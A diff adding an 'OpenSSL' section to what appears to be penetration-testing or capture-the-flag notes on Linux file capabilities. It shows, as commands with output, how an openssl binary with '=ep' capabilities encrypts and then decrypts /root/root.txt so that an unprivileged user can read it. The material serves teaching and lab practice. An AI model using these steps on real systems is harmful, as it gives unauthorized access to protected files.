@@ -37,3 +37,25 @@ root@attacker-machine:~# find . * 2>/dev/null | xargs -I {} getcap {} 2>/dev/nul
 /usr/bin/command = cap_dac_read_search+ei
 ```
 Then, we can try to analyze the command as a binary with `strings`, `gdb`, or test it by fuzzing, or execution trial an error.
+### OpenSSL
+Here is an OpenSSL example of how to utilize Unix Capabilities to read a file that you don't have read access to. If we use `openssl` which has the capabilities set as `=ep`, as shown below,
+```
+unprivuser@target-system:~$ find . * 2>/dev/null | xargs -I {} getcap {} 2>/dev/null
+openssl =ep
+```
+We can run `./openssl` to encrypt a file for us, then again to decrypt it. This process essentially creates a new file which we have permission to read. Try this,
+```
+unprivuser@target-system:~$ ./openssl aes-256-cbc -a -salt -in /root/root.txt -out root.txt.enc
+enter aes-256-cbc encryption password:
+Verifying - enter aes-256-cbc encryption password:
+unprivuser@target-system:~$ ls -lah
+-rw-rw-r--. 1 unprivuser unprivuser   90 Jan 18 14:28 root.txt.enc
+```
+Now we decrypt the new file, using the password we chose during the encryption process, and we can read ikt's contents.
+```
+unprivuser@target-system:~$ openssl aes-256-cbc -d -a -in root.txt.enc -out root.txt
+enter aes-256-cbc decryption password:
+unprivuser@target-system:~$ cat root.txt
+This was a privileged flag file in /root ! How did you read me!?!
+unprivuser@target-system:~$
+```
